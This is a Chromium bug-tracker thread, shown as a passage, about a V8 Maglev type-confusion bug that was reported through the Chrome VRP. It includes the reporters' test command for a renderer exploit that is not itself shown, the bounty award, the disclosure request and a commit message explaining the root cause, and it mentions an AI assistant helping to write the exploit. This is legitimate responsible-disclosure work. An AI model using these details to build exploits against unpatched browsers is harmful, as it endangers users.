For the *Chromium* exploit, I am still working on it, and I will update later if the attempt succeeds.

### ct...@chromium.org (2026-04-24)

Thanks, do keep us updated. The VRP's plan was to reward [Issue 501147587](https://issues.chromium.org/issues/501147587) as-is (it was awarded the lower $5K sandbox bypass) and then reward this based on whether there is a functional renderer exploit.

### ct...@chromium.org (2026-05-05)

Please let us know if you are able to get a functional Chromium exploit for this bug. Otherwise, the VRP panel intends to reward this bug as-is next week.

### qq...@calif.io (2026-05-08)

We do have a functional Chromium exploit for this, tested on *Chrome 147.0.7727.101 Linux x64*. The code quality is not the best and the exploit is not well documented for now. However, the exploit should be quite reliable. We tested with the below flags (`rm -rf /tmp/pwned` if needed):

```
./chrome \
  --headless=new \
  --no-sandbox --no-first-run --no-default-browser-check \
  --disable-gpu --disable-crash-reporter --disable-breakpad \
  --enable-logging=stderr \
  --user-data-dir="/tmp/vrp_renderer_rce" \
  "file://$PWD/exp_linux_147_vrp.html"

```

If the exploit succeeds, the folder `/tmp/pwned` should be created. Please let us know if you have any issue reproducing this.

---

##### Acknowledgement

This exploit is based on works of my colleagues: Tuan Do and Duc Phan of Calif.IO

I vibe coded this with assistance from Claude of Anthropic Research, but the work here is indeed tested.

### ct...@chromium.org (2026-05-08)

Thank you! I was able to successfully reproduce the exploit triggering the creation of a `/tmp/pwned` folder, both with and without `--headless=new`.

### sp...@google.com (2026-05-13)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
High quality with exploit. Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### qq...@calif.io (2026-05-19)

Hello,

As it has been over 30 days since our initial report and the fix is already shipped, **we would like to request permission for early disclosure**.

We believe doing so is entirely safe at this stage. Furthermore, because the patch is public, anyone can easily use LLMs to perform patch analysis and reverse-engineer the vulnerability nowsadays. Disclosing the details now will ensure defenders have the same context as potential attackers.

### pe...@google.com (2026-06-10)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-06-10)

1. https://chromium-review.git.corp.google.com/c/v8/v8/+/7901772
2. Low - There were a few conflicts.
3. 146, 147, and 148
4. Yes.

### dx...@google.com (2026-06-18)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7901772>

[M144-LTS][maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

---


Expand for full commit details
```
[M144-LTS][maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

The elision added in CL 6988172 (commit 6469250a124a) skipped the
runtime check whenever TryGetInt32Constant(object) returned a value in
Smi range. For non-tagged input representations this is sound, because
the switch below emits a value-range check (CheckInt32IsSmi /
CheckUint32IsSmi / CheckFloat64IsSmi / CheckHoleyFloat64IsSmi /
CheckIntPtrIsSmi), which is exactly what Smi::IsValid proves.

For kTagged inputs the emitted check is CheckSmi, a tag-bit check.
Value-equivalence does not imply Smi tagging: a tagged node can be equal
in value to a Smi-range constant while actually holding a HeapNumber at
runtime. This happens when BuildCheckNumericalValue's HeapNumber branch
records a Constant(HeapNumber N) in the node's checked_value alternative
after a CheckFloat64SameValue; since CheckFloat64SameValue only proves
numeric equality, both Smi(N) and HeapNumber(N) pass it.
TryGetInt32Constant recurses through the alternative and returns N, so
the elision drops the tag check and a HeapNumber pointer can flow into
downstream consumers (e.g. the kSmi-field store path via
StoreTaggedFieldNoWriteBarrier), causing a type confusion and a missing
write barrier.

Gate the elision on value_representation() != kTagged. For tagged Smi
inputs the earlier StaticTypeIs(kSmi) / EnsureType(kSmi) early returns
already handle elision via type-system facts, which carry the tag
guarantee the value-equivalence alternative does not.

(cherry picked from commit b9be4febd638434a37a4215b8ea9ae1f8fab4df6)

Fixed: 500880819
Change-Id: Ida0c18551974c5d861e0aed6f881439d04598c0b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7761542
Reviewed-by: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Jakob Linke <jgruber@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#106450}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7901772
Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com>
Reviewed-by: Jakob Linke <jgruber@chromium.org>
Cr-Commit-Position: refs/branch-heads/14.4@{#96}
Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1}
Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/maglev/regress/regress-500880819.js`
- A `test/mjsunit/maglev/regress/regress-501789186.js`

---

Hash: [32a8fd87dd7a401d10512fc92ebac0b07a83ced0](https://chromiumdash.appspot.com/commit/32a8fd87dd7a401d10512fc92ebac0b07a83ced0)  

Date: Tue Apr 14 06:46:10 2026


---

### ch...@google.com (2026-07-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/500880819)*
